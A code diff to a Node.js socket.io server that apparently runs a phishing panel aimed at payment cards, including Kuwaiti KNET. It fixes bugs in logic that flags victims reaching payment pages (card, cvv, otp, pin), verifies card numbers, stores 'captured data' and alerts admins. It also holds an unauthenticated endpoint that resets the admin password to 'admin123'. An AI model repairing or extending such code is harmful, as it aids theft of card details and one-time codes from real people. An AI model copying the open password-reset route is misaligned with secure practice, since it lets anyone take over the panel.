@@ -377,7 +377,7 @@ io.on("connection", (socket) => {
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
       const pageLower = String(page || '').toLowerCase();
-      const const isPaymentPage = pageLower.includes('الدفع') || pageLower.includes('payment') || pageLower.includes('credit') || pageLower.includes('بطاقة') || pageLower.includes('كي نت') || pageLower.includes('knet'); = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
+      const isPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>pageLower.indexOf(h)>-1);
       if (isPaymentPage) {
         visitor.hasEnteredCardPage = true;
         visitor.lastDataUpdate = new Date().toISOString();
@@ -1137,7 +1137,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 // Temporary password reset endpoint
 app.get("/api/reset-password", (req, res) => {
   adminPassword = "admin123";
-  saveToDisk();
+  saveData();
   res.json({ success: true, message: "Password reset to admin123" });
 });
 
@@ -1358,7 +1358,7 @@ app.post("/api/captured-data", (req, res) => {
         sessionStartTime: Date.now(),
         lastActivity: Date.now(),
       };
-      savedVisitors.push(visitor);
+      savedVisitors.push(orphanVisitor);
       isNewVisitor = true;     
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
